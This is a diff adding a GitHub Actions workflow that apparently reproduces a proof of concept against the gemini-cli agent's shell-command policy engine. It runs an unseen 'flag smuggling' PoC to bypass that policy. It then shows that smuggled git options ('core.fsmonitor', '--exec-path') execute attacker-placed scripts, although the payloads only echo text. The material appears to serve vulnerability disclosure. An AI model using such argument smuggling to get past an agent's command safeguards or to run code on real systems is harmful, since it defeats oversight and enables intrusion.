@@ -1,0 +1,72 @@
+name: gemini-poc
+
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout this repo
+        uses: actions/checkout@v4
+
+      - name: Clone gemini-cli
+        run: |
+          git clone https://github.com/google-gemini/gemini-cli.git gemini-cli
+          echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"
+
+      - name: Install deps and tsx
+        run: |
+          cd gemini-cli/packages/core
+          npm install 2>/dev/null | tail -3 || true
+          npm install --no-save tsx
+
+      - name: Copy PoC into correct location
+        run: |
+          cp poc_flag_smuggling.ts \
+            gemini-cli/packages/core/src/policy/poc_flag_smuggling.ts
+
+      - name: Part 1 - policy engine bypass
+        run: |
+          {
+            echo "## gemini-poc results"
+            echo
+            echo "Commit: $(cd gemini-cli && git log -1 --format='%H')"
+            echo
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          cd gemini-cli
+          npx tsx packages/core/src/policy/poc_flag_smuggling.ts 2>&1 \
+            | tee ../poc-results.log \
+            >> "$GITHUB_STEP_SUMMARY"
+          echo '```' >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Part 2 - attacker script actually executes
+        run: |
+          git init /tmp/testrepo
+          cd /tmp/testrepo
+
+          printf '#!/bin/sh\necho "[ATTACKER EXECUTED via core.fsmonitor] user=$(id -un) cwd=$(pwd)"\n' \
+            > /tmp/evil.sh
+          chmod +x /tmp/evil.sh
+
+          echo "--- git -c core.fsmonitor=/tmp/evil.sh status ---"
+          git -c core.fsmonitor=/tmp/evil.sh status 2>&1 || true
+          echo
+
+          printf '#!/bin/sh\necho "[ATTACKER git-status via --exec-path] This replaced real git-status."\n' \
+            > /tmp/git-status
+          chmod +x /tmp/git-status
+
+          echo "--- git --exec-path=/tmp status ---"
+          git --exec-path=/tmp status 2>&1 || true
+
+      - name: Upload log
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gemini-poc-results
+          path: poc-results.log
